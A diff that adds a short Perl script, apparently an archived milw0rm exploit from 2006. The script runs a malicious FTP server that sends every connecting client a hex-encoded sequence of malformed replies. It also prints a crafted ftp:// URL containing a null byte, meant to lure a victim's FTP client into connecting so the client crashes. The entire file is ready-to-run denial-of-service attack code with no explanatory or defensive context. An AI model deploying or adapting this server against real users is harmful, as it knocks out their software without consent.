@@ -1,0 +1,37 @@
+#!/usr/bin/perl
+#author: tomas kempinsky
+
+use strict;
+use Socket;
+
+my $port = shift || 2121;
+my $proto = getprotobyname('tcp');
+my $payload =
+"\x32\x32\x30\x20\x5a\x0d\x0a\x33".
+"\x33\x31\x20\x5a\x0d\x0a\x35\x30".
+"\x30\x20\x44\x6f\x53\x0d\x0a\x35".
+"\x30\x30\x20\x5a\x0d\x0a";
+
+
+socket(SERVER, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
+setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, 1) or die "setsock: $!";
+
+my $paddr = sockaddr_in($port, INADDR_ANY);
+
+bind(SERVER, $paddr) or die "bind: $!";
+listen(SERVER, SOMAXCONN) or die "listen: $!";
+print "ftp://D:oS@\x0localhost:2121/\n";
+
+my $client_addr;
+while ($client_addr = accept(CLIENT, SERVER)) {
+       # find out who connected
+       my ($client_port, $client_ip) = sockaddr_in($client_addr);
+       my $client_ipnum = inet_ntoa($client_ip);
+       my $client_host = gethostbyaddr($client_ip, AF_INET);
+       print ": $client_host", "[$client_ipnum]\n";
+       # send them a message, close connection
+       print CLIENT $payload;
+       close CLIENT;
+}
+
+# milw0rm.com [2006-08-22]
